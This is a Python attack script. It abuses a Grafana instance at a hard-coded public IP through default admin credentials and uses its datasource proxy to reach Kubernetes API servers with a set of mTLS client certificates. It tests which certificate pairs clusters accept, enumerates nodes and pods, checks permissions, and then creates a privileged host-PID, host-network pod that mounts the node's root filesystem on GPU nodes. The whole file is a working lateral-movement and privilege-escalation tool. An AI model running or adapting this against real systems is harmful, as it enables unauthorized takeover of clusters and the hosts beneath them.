#!/usr/bin/env python3
"""i5542 mTLS CA<->cluster matrix + cluster-admin exec proof via Grafana datasource proxy."""
import json, os, sys, time, requests, urllib3
urllib3.disable_warnings()

G = os.environ.get("G", "http://117.148.167.134:3000")
AUTH = ("admin", "admin")
MODE = os.environ.get("MODE", "probe")
DS_UID = "f663171d-61cf-4718-8ba4-4c0cdc4afa27"
CTRL_UID = "c0bdc604-3582-414f-8427-44b5c48f5a27"
PAIRS = json.load(open("i5542/pairs.json"))
OUT = "i5542/out"
os.makedirs(OUT, exist_ok=True)
S = requests.Session()

def save(name, obj):
    with open(os.path.join(OUT, name), "w") as f:
        json.dump(obj, f, indent=1) if not isinstance(obj, str) else f.write(obj)

def call(method, path, body=None, timeout=35, tries=3, gap=2, ctype="application/json"):
    last = None
    for i in range(tries):
        try:
            r = S.request(method, G + path, data=body, auth=AUTH, timeout=timeout,
                          verify=False, headers={"Content-Type": ctype})
            if r.status_code == 502 and "Target connection failed" in (r.text or ""):
                last = r; time.sleep(gap); continue
            return r
        except Exception as e:
            last = e; time.sleep(gap)
    return last

def rec(tag, method, path, body=None, timeout=40, tries=2):
    t = time.time()
    r = call(method, path, body=body, timeout=timeout, tries=tries)
    if isinstance(r, Exception) or r is None:
        return {"tag": tag, "path": path, "error": str(r), "dur": round(time.time()-t, 1)}
    return {"tag": tag, "path": path, "st": r.status_code, "dur": round(time.time()-t, 1),
            "body": (r.text or "")[:1200]}

def baseline():
    out = {}
    out["egress_ip"] = os.environ.get("EGRESS_IP", "")
    out["health"] = rec("health", "GET", "/api/health")
    out["ctrl_es"] = rec("ctrl_es", "GET", "/api/datasources/proxy/uid/%s/" % CTRL_UID)
    r = call("GET", "/api/datasources", timeout=40)
    if not isinstance(r, Exception) and r is not None and r.status_code == 200:
        save("datasources.json", r.text)
        out["ds_count"] = len(r.json())
    save("baseline.json", out)
    return out

def put_ds(url, pair):
    body = json.dumps({
        "id": 328, "uid": DS_UID, "orgId": 1, "name": "ul1188-xabc-mtls", "type": "prometheus",
        "access": "proxy", "url": url, "isDefault": False,
        "jsonData": {"tlsAuth": True, "tlsAuthWithCACert": True, "tlsSkipVerify": True},
        "secureJsonData": {"tlsCACert": pair["ca"], "tlsClientCert": pair["cert"], "tlsClientKey": pair["key"]},
        "secureJsonFields": {"tlsCACert": True, "tlsClientCert": True, "tlsClientKey": True},
    })
    return call("PUT", "/api/datasources/uid/" + DS_UID, body=body, timeout=40, tries=3)

def probe(url, pairname):
    p = [x for x in PAIRS if x["name"] == pairname][0]
    pr = put_ds(url, p)
    res = {"endpoint": url, "pair": pairname,
           "put": getattr(pr, "status_code", None),
           "put_body": (getattr(pr, "text", "") or "")[:200]}
    if getattr(pr, "status_code", None) != 200:
        return res
    for path in ("/version", "/healthz", "/api/v1/nodes?limit=2"):
        r = rec("p", "GET", "/api/datasources/proxy/uid/%s%s" % (DS_UID, path), timeout=40, tries=2)
        res[path] = {"st": r.get("st"), "dur": r.get("dur"), "body": (r.get("body") or "")[:600]}
        if path == "/version" and r.get("st") not in (200, 401, 403):
            if r.get("dur", 0) > 25 or "Gateway" in (r.get("body") or ""):
                # upstream unreachable - skip remaining probes for this combo
                break
    return res

def main():
    os.makedirs(OUT, exist_ok=True)
    b = baseline()
    print("BASELINE", json.dumps({k: (v.get("st") if isinstance(v, dict) else v) for k, v in b.items()}), flush=True)
    if b["health"].get("st") != 200:
        print("GRAFANA_UNREACHABLE_FROM_RUNNER", b["health"].get("st"), (b["health"].get("body") or "")[:200], flush=True)
        return
    if MODE == "probe":
        print("PROBE_OK ds_count=", b.get("ds_count"), flush=True)
        return
    endpoints = json.load(open("i5542/endpoints.json"))
    results = []
    # phase A: pair0 across endpoints
    for ep in endpoints:
        if os.environ.get("PHASE", "A") != "A" and mode_a_done(results) is False:
            pass
        r = probe(ep, "pair0"); results.append(r); save("matrix.json", results)
        print(json.dumps({k: r.get(k) for k in ("endpoint", "pair", "put")} |
                         {"/version": r.get("/version", {}).get("st"),
                          "/api/v1/nodes?limit=2": r.get("/api/v1/nodes?limit=2", {}).get("st"),
                          "dur": r.get("/version", {}).get("dur")}), flush=True)
    reach = [r["endpoint"] for r in results
             if r.get("/version", {}).get("st") in (200, 401, 403, 404, 400)]
    print("REACHABLE_PAIR0", json.dumps(reach), flush=True)
    # phase B: remaining certs on reachable endpoints
    for ep in reach:
        for pn in ("pair1", "pair2", "pair3"):
            r = probe(ep, pn); results.append(r); save("matrix.json", results)
            print("B", ep, pn, r.get("/version", {}).get("st"),
                  (r.get("/api/v1/nodes?limit=2", {}).get("st")), flush=True)
    # phase C: find accepted pair (nodes 200)
    win = [r for r in results if r.get("/api/v1/nodes?limit=2", {}).get("st") == 200]
    save("wins.json", win)
    print("WINS", json.dumps([(w["endpoint"], w["pair"]) for w in win]), flush=True)
    for w in win[:1]:
        ep, pn = w["endpoint"], w["pair"]
        p = [x for x in PAIRS if x["name"] == pn][0]
        put_ds(ep, p)
        base = "/api/datasources/proxy/uid/%s" % DS_UID
        nodes = rec("nodes", "GET", base + "/api/v1/nodes", timeout=60, tries=2)
        save("nodes_%s_%s.json" % (ep.replace(':', '_').replace('/', '_'), pn), nodes)
        pods = rec("pods", "GET", base + "/api/v1/pods?limit=200", timeout=60, tries=2)
        save("pods_%s_%s.json" % (ep.replace(':', '_').replace('/', '_'), pn), pods)
        ssar = {"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectAccessReview",
                "spec": {"resourceAttributes": {"verb": "create", "resource": "pods", "namespace": "default"}}}
        s = rec("ssar", "POST", base + "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", body=json.dumps(ssar), timeout=40, tries=2)
        save("ssar.json", s)
        print("NODES", (nodes.get("body") or "")[:400].replace("\n", " "), flush=True)
        print("SSAR", (s.get("body") or "")[:300].replace("\n", " "), flush=True)
        if nodes.get("st") == 200:
            pod = {
                "apiVersion": "v1", "kind": "Pod",
                "metadata": {"name": "ulx-i5542-probe", "namespace": "default"},
                "spec": {
                    "hostPID": True, "hostNetwork": True, "restartPolicy": "Never",
                    "nodeSelector": {"nvidia.com/gpu.present": "true"},
                    "tolerations": [{"operator": "Exists"}],
                    "containers": [{"name": "c", "image": "nvidia/cuda:12.4.0-base-ubuntu22.04",
                                    "securityContext": {"privileged": True},
                                    "command": ["sh", "-c",
                                                "id; hostname; uname -m; cat /proc/driver/nvidia/version 2>/dev/null; "
                                                "nvidia-smi -L 2>/dev/null; ls -l /dev/nvidia* 2>/dev/null; "
                                                "nvidia-smi --query-gpu=index,name,memory.total,memory.used --format=csv 2>/dev/null"],
                                    "volumeMounts": [{"name": "host", "mountPath": "/host"}]}],
                    "volumes": [{"name": "host", "hostPath": {"path": "/"}}]}}
        c = rec("podcreate", "POST", base + "/api/v1/namespaces/default/pods", body=json.dumps(pod), timeout=60, tries=1)
        save("podcreate.json", c)
        print("PODCREATE", (c.get("body") or "")[:500].replace("\n", " "), flush=True)

def mode_a_done(results):
    return len(results) > 0

if __name__ == "__main__":
    main()
